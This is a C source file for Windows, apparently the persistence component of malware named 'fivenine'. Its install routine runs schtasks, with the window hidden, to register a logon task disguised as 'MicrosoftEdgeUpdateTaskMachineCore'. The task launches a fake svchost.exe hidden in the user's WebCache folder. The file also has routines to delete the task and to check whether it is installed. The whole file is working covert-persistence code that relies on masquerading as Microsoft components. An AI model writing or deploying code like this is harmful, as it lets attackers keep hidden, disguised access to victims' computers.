#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "fivenine.h"

#define TASK_NAME "MicrosoftEdgeUpdateTaskMachineCore"

void RunSilentCommand(const char *command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(NULL, (LPSTR)command, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW | DETACHED_PROCESS,
                   NULL, NULL, &si, &pi);

    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
}

int fivenine_install(void)
{
    char localappdata[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localappdata, MAX_PATH);

    char hidden_exe[MAX_PATH];
    snprintf(hidden_exe, MAX_PATH, "%s\\Microsoft\\Windows\\WebCache\\svchost.exe", localappdata);

    char cmd[1024];
    // On utilise 'cmd /c' pour être sûr que la commande passe
    snprintf(cmd, sizeof(cmd),
             "cmd.exe /c schtasks /create /tn \"MicrosoftEdgeUpdateTaskMachineCore\" /tr \"\\\"%s\\\"\" /sc onlogon /f",
             hidden_exe);

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return -1;
                   }

    WaitForSingleObject(pi.hProcess, 5000);
    DWORD exit_code = 0;
    GetExitCodeProcess(pi.hProcess, &exit_code);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (int)exit_code;
}

int fivenine_uninstall(void)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f", TASK_NAME);

    RunSilentCommand(cmd);
    return 0;
}

int fivenine_is_installed(void)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "schtasks /query /tn \"%s\"", TASK_NAME);

    char full_cmd[1024];
    snprintf(full_cmd, sizeof(full_cmd), "%s > nul 2>&1", cmd);

    int rc = system(full_cmd);
    return (rc == 0) ? 1 : 0;
}